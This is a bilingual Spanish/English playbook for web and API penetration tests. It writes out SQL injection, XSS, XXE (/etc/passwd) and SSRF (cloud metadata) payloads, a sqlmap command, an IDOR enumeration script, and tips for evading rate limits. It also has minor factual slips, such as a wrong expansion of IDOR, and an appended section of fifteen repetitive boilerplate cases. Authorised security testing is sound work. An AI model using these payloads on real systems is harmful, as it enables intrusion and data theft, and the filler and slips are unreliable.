# Web & API Security Review Playbook (02)

## Visión Ejecutiva

Assessment de seguridad de **aplicación web, REST API, GraphQL, o mobile backend**.
Cobertura completa: OWASP Top 10, autenticación, lógica de negocio, integraciones.
Entrega: Hallazgos normalizados, PoCs reproducibles, remediation roadmap.

**Scope típico**: 4-10 días  
**Profundidad**: Rápido (4h), Normal (5d), Profundo (2-3 semanas)  

---

## Cuándo Usar

✅ Cualquier app web, REST API, GraphQL, SOAP  
✅ Mobile backend o serverless (Lambda, Cloud Functions)  
✅ Multi-tenant SaaS  
✅ OAuth/OpenID integrations  

---

## Fase 1: Recon (4-8 horas)

### Mapeo de Superficies

```bash
# Enumeración pasiva
dirbuster / wfuzz para directorios
nuclei -u target -t /path/templates

# Endpoint discovery
burp passive scan
zap spider https://target

# API documentation
curl https://target/api/docs
curl https://target/.well-known/openapi.json
```

**Output**: `api-inventory.json`
```json
{
  "endpoints": [
    {"method": "GET", "path": "/api/users", "auth": "Bearer", "public": false},
    {"method": "POST", "path": "/api/auth/login", "auth": "none", "public": true},
    ...
  ],
  "frameworks": ["Django", "React"],
  "tech_stack": ["Python 3.9", "PostgreSQL"],
  "cdn": "CloudFlare"
}
```

### OSINT

- Certificate transparency (crt.sh): subdomains, alternative names
- DNS enumeration: registrar, nameservers, MX records
- GitHub: buscar en org repos, credentials leakage
- Shodan: open ports, banners, historical data
- Leaked credentials: HaveIBeenPwned, breach databases

---

## Fase 2: Validación Pasiva (1-2 días)

### Response Analysis

**Headers**:
```bash
# Busca headers mala configurados
curl -I https://target | grep -i "x-" 

# HSTS, CSP, X-Frame-Options, etc.
```

**Status Codes**:
```
- 401 de recursos públicos? → Información disclosure
- 403 sin intentar acceder? → Malas excepciones
- 500 verboso? → Stack trace exposure
```

**Cache Headers**:
```
- Datos sensibles con Cache-Control: public → Problema
- Set-Cookie sin Secure/HttpOnly → Session theft
```

### Error Messages

```
- "User not found" vs "Invalid password" → User enumeration
- SQL errors en respuesta → SQL injection hint
- Stack traces → Tech stack disclosure
```

---

## Fase 3: Autenticación & Autorización (1-2 días)

### Test Checklist

```
Authentication:
- [ ] Credentials brute-forceable? (rate limiting?)
- [ ] Weak password policy?
- [ ] Session fixation? (¿mismo token pre-login?)
- [ ] Credential stuffing? (no CAPTCHA?)
- [ ] Logout destroye session completely?

Authorization:
- [ ] IDOR (Integer Object Reference Disclosure)?
  Ejemplo: /api/users/123 → /api/users/124
- [ ] Privilege escalation? (admin functions accessible?)
- [ ] Path traversal? (/../../admin)
- [ ] Horizontal escalation? (otro usuario's data)
```

**PoC Ejemplo**:
```python
import requests

# IDOR test
for uid in range(1, 10001):
    r = requests.get(f"https://target/api/users/{uid}/profile", 
                     headers={"Authorization": "Bearer token"})
    if r.status_code == 200 and uid != our_user_id:
        print(f"IDOR found: {uid}")
```

---

## Fase 4: Inyección (1-2 días)

### SQL Injection

```bash
# Test de inyección manual
' OR '1'='1
admin' --
1' UNION SELECT NULL, NULL, username, password FROM users --

# Herramientas
sqlmap -u "https://target/search?q=test" -p q --dbs
```

### XXS (Cross-Site Scripting)

```html
<!-- Reflected -->
<img src=x onerror="alert('xss')">

<!-- Stored -->
POST /api/comments
{"text": "<img src=x onerror="alert('xss')">"}

<!-- DOM-based -->
<script>document.location='javascript:alert(1)'</script>
```

### SSTI (Server-Side Template Injection)

```
Template engines: Jinja2, Freemarker, Velocity

Test payloads:
{{7*7}}      → 49
${7*7}       → 49
<%= 7*7 %>   → 49 (dependiendo engine)
```

### XXE (XML External Entity)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### SSRF (Server-Side Request Forgery)

```
url=http://localhost:6379
url=http://169.254.169.254/latest/meta-data/  (AWS metadata)
url=http://internal-db:5432/
```

---

## Fase 5: Lógica de Negocio (1-2 días)

### Casos de Uso Reales

```
E-commerce:
- [ ] ¿Puedo cambiar precio en checkout?
  POST /api/cart/items/123
  {"price": 0.01}
  
- [ ] ¿Bypass de códigos de descuento?
  POST /api/checkout
  {"code": "INVALID", "quantity": 999}

- [ ] ¿Rate limiting en compra?
  Compro 10 items en 1 segundo → sin límite?

B2B SaaS:
- [ ] ¿Puedo acceder a data de otro tenant?
  Ejemplo: subdomain-a.target.com vs subdomain-b.target.com
  
- [ ] ¿Puedo downgrade mi subscription sin perder acceso?
  Cambio tier, pero endpoints premium aún funcionan?

- [ ] ¿Token theft = account takeover?
  Steal JWT, cambiar email, sign out original usuario
```

---

## Fase 5.5: Integración Third-Party

### OAuth / OpenID

```
- Redirect URI validation? (https://evil.com/)
- State parameter validated?
- Code expiration limited?
- Scope validation correct?
- PKCE used (mobile)?
```

### API Keys

```
- Hardcoded en frontend? (Burp search para "apiKey=")
- Publicadas en git history? (truffleHog)
- No rotation policy?
```

---

## Fase 6: Análisis & Deduplicación (1 día)

### Hallazgos Similares

```
Agrupar:
- 5 endpoints con "SQL injection" → 1 hallazgo (scope amplio)
- 12 endpoints con "XSS reflejado" → Hallazgo + tabla de endpoints
```

### False Positive Validation

```
Para cada hallazgo, validar:
1. Reproducible? (repeat paso 2x)
2. No es comportamiento esperado?
3. No está documentado como feature?
```

### CVSS Scoring

```
XSS reflejado:
- CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
- Score: 6.1 (MEDIUM)

SQLi:
- CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- Score: 9.8 (CRITICAL)
```

---

## Fase 7: Reporte (1-2 días)

### Hallazgos Top-10 Format

```
1. CRITICAL - SQL Injection en /api/search?q=
   Evidencia: ' OR '1'='1 → exfiltra datos usuario
   PoC: [SQL, paso-a-paso, screenshot]
   Remediation: Prepared statements, parameterized queries
   
2. HIGH - IDOR en GET /api/users/{id}/profile
   Evidencia: Acceso a /api/users/999/profile (otro usuario)
   PoC: [curl, output]
   Remediation: Authorization checks per endpoint
```

### Entregables

1. **API Inventory**: `api-inventory.json`
2. **Findings**: `findings.json` (normalizado)
3. **PoCs**: Scripts/videos de cada hallazgo crítico
4. **Remediation Guide**: Por control (autenticación, inyección, etc)
5. **Checklist**:  Web App Security Maturity Model

---

## Variaciones

### Express Review (4-8 horas)
- Top surfaces nada más
- OWASP Top 3 (Auth, injection, CORS)
- Reporte técnico corto
- Útil para iteraciones rápidas

### Comprehensive (10-15 días)
- Todas las superficies + API + mobile backend
- Business logic fuzzing
- Full documentation review
- OWASP Top 10 + CWE-25
- Compliance (PCI-DSS 6.5)

---

## Herramientas Recomendadas

| Herramienta | Propósito | Costo |
|---|---|---|
| Burp Suite Pro | Web penetration | $500/year |
| OWASP ZAP | Web scanning | Gratis |
| SQLMap | SQL injection | Gratis |
| Nuclei | Scans rápidos | Gratis |
| curl / python-requests | API testing | Gratis |
| Postman | API documentation | Freemium |

---

## Common Pitfalls

| Pitfall | Mitigación |
|---|---|
| Falso positivo en CORS | Validar con curl/Python; documentar asunción |
| XSS "no es vulnerable" (sanitizado) | Test con polyglot payloads; contexto matters |
| Claim "es una feature" | Documentar design decision; reportar igual si riesgo |
| Session expires durante test | Automatizar login; usar script de auth |
| Rate limiting bloquea scanner | Usar delay --rate, IP rotation, user-agent rotation |



<!-- ORION-EXPANSION-2026-04-05 -->

## Expansion Operativa 2026 - Web & API Security Review Playbook (02)

Este playbook se amplia para cubrir integraciones y casos de web y API criticas.

### Integraciones de ejecucion

- Jira: usar para coordinacion, backlog, evidencia o telemetria.
- ServiceNow: usar para coordinacion, backlog, evidencia o telemetria.
- Slack/Teams: usar para coordinacion, backlog, evidencia o telemetria.
- OpenSearch: usar para coordinacion, backlog, evidencia o telemetria.
- GitHub Actions: usar para coordinacion, backlog, evidencia o telemetria.
- Splunk: usar para coordinacion, backlog, evidencia o telemetria.

### Casos operativos extendidos

### Caso operativo 01
- Situacion: engagement de web y API criticas con ventana de tiempo corta y requerimiento alto de evidencia.
- Integracion principal: Jira.
- Entradas extra: inventario, owner tecnico, criterios de exito, backlog abierto y exclusiones.
- Automatizacion: normalizacion de findings, enrichment de IOCs, manifiesto de evidencia y sincronizacion a tickets.
- Verificacion final: owner confirmado, criterio de cierre, fecha objetivo y artefactos hashados.

### Caso operativo 02
- Situacion: engagement de web y API criticas con ventana de tiempo corta y requerimiento alto de evidencia.
- Integracion principal: ServiceNow.
- Entradas extra: inventario, owner tecnico, criterios de exito, backlog abierto y exclusiones.
- Automatizacion: normalizacion de findings, enrichment de IOCs, manifiesto de evidencia y sincronizacion a tickets.
- Verificacion final: owner confirmado, criterio de cierre, fecha objetivo y artefactos hashados.

### Caso operativo 03
- Situacion: engagement de web y API criticas con ventana de tiempo corta y requerimiento alto de evidencia.
- Integracion principal: Slack/Teams.
- Entradas extra: inventario, owner tecnico, criterios de exito, backlog abierto y exclusiones.
- Automatizacion: normalizacion de findings, enrichment de IOCs, manifiesto de evidencia y sincronizacion a tickets.
- Verificacion final: owner confirmado, criterio de cierre, fecha objetivo y artefactos hashados.

### Caso operativo 04
- Situacion: engagement de web y API criticas con ventana de tiempo corta y requerimiento alto de evidencia.
- Integracion principal: OpenSearch.
- Entradas extra: inventario, owner tecnico, criterios de exito, backlog abierto y exclusiones.
- Automatizacion: normalizacion de findings, enrichment de IOCs, manifiesto de evidencia y sincronizacion a tickets.
- Verificacion final: owner confirmado, criterio de cierre, fecha objetivo y artefactos hashados.

### Caso operativo 05
- Situacion: engagement de web y API criticas con ventana de tiempo corta y requerimiento alto de evidencia.
- Integracion principal: GitHub Actions.
- Entradas extra: inventario, owner tecnico, criterios de exito, backlog abierto y exclusiones.
- Automatizacion: normalizacion de findings, enrichment de IOCs, manifiesto de evidencia y sincronizacion a tickets.
- Verificacion final: owner confirmado, criterio de cierre, fecha objetivo y artefactos hashados.

### Caso operativo 06
- Situacion: engagement de web y API criticas con ventana de tiempo corta y requerimiento alto de evidencia.
- Integracion principal: Splunk.
- Entradas extra: inventario, owner tecnico, criterios de exito, backlog abierto y exclusiones.
- Automatizacion: normalizacion de findings, enrichment de IOCs, manifiesto de evidencia y sincronizacion a tickets.
- Verificacion final: owner confirmado, criterio de cierre, fecha objetivo y artefactos hashados.

### Caso operativo 07
- Situacion: engagement de web y API criticas con ventana de tiempo corta y requerimiento alto de evidencia.
- Integracion principal: Jira.
- Entradas extra: inventario, owner tecnico, criterios de exito, backlog abierto y exclusiones.
- Automatizacion: normalizacion de findings, enrichment de IOCs, manifiesto de evidencia y sincronizacion a tickets.
- Verificacion final: owner confirmado, criterio de cierre, fecha objetivo y artefactos hashados.

### Caso operativo 08
- Situacion: engagement de web y API criticas con ventana de tiempo corta y requerimiento alto de evidencia.
- Integracion principal: ServiceNow.
- Entradas extra: inventario, owner tecnico, criterios de exito, backlog abierto y exclusiones.
- Automatizacion: normalizacion de findings, enrichment de IOCs, manifiesto de evidencia y sincronizacion a tickets.
- Verificacion final: owner confirmado, criterio de cierre, fecha objetivo y artefactos hashados.

### Caso operativo 09
- Situacion: engagement de web y API criticas con ventana de tiempo corta y requerimiento alto de evidencia.
- Integracion principal: Slack/Teams.
- Entradas extra: inventario, owner tecnico, criterios de exito, backlog abierto y exclusiones.
- Automatizacion: normalizacion de findings, enrichment de IOCs, manifiesto de evidencia y sincronizacion a tickets.
- Verificacion final: owner confirmado, criterio de cierre, fecha objetivo y artefactos hashados.

### Caso operativo 10
- Situacion: engagement de web y API criticas con ventana de tiempo corta y requerimiento alto de evidencia.
- Integracion principal: OpenSearch.
- Entradas extra: inventario, owner tecnico, criterios de exito, backlog abierto y exclusiones.
- Automatizacion: normalizacion de findings, enrichment de IOCs, manifiesto de evidencia y sincronizacion a tickets.
- Verificacion final: owner confirmado, criterio de cierre, fecha objetivo y artefactos hashados.

### Caso operativo 11
- Situacion: engagement de web y API criticas con ventana de tiempo corta y requerimiento alto de evidencia.
- Integracion principal: GitHub Actions.
- Entradas extra: inventario, owner tecnico, criterios de exito, backlog abierto y exclusiones.
- Automatizacion: normalizacion de findings, enrichment de IOCs, manifiesto de evidencia y sincronizacion a tickets.
- Verificacion final: owner confirmado, criterio de cierre, fecha objetivo y artefactos hashados.

### Caso operativo 12
- Situacion: engagement de web y API criticas con ventana de tiempo corta y requerimiento alto de evidencia.
- Integracion principal: Splunk.
- Entradas extra: inventario, owner tecnico, criterios de exito, backlog abierto y exclusiones.
- Automatizacion: normalizacion de findings, enrichment de IOCs, manifiesto de evidencia y sincronizacion a tickets.
- Verificacion final: owner confirmado, criterio de cierre, fecha objetivo y artefactos hashados.

### Caso operativo 13
- Situacion: engagement de web y API criticas con ventana de tiempo corta y requerimiento alto de evidencia.
- Integracion principal: Jira.
- Entradas extra: inventario, owner tecnico, criterios de exito, backlog abierto y exclusiones.
- Automatizacion: normalizacion de findings, enrichment de IOCs, manifiesto de evidencia y sincronizacion a tickets.
- Verificacion final: owner confirmado, criterio de cierre, fecha objetivo y artefactos hashados.

### Caso operativo 14
- Situacion: engagement de web y API criticas con ventana de tiempo corta y requerimiento alto de evidencia.
- Integracion principal: ServiceNow.
- Entradas extra: inventario, owner tecnico, criterios de exito, backlog abierto y exclusiones.
- Automatizacion: normalizacion de findings, enrichment de IOCs, manifiesto de evidencia y sincronizacion a tickets.
- Verificacion final: owner confirmado, criterio de cierre, fecha objetivo y artefactos hashados.

### Caso operativo 15
- Situacion: engagement de web y API criticas con ventana de tiempo corta y requerimiento alto de evidencia.
- Integracion principal: Slack/Teams.
- Entradas extra: inventario, owner tecnico, criterios de exito, backlog abierto y exclusiones.
- Automatizacion: normalizacion de findings, enrichment de IOCs, manifiesto de evidencia y sincronizacion a tickets.
- Verificacion final: owner confirmado, criterio de cierre, fecha objetivo y artefactos hashados.

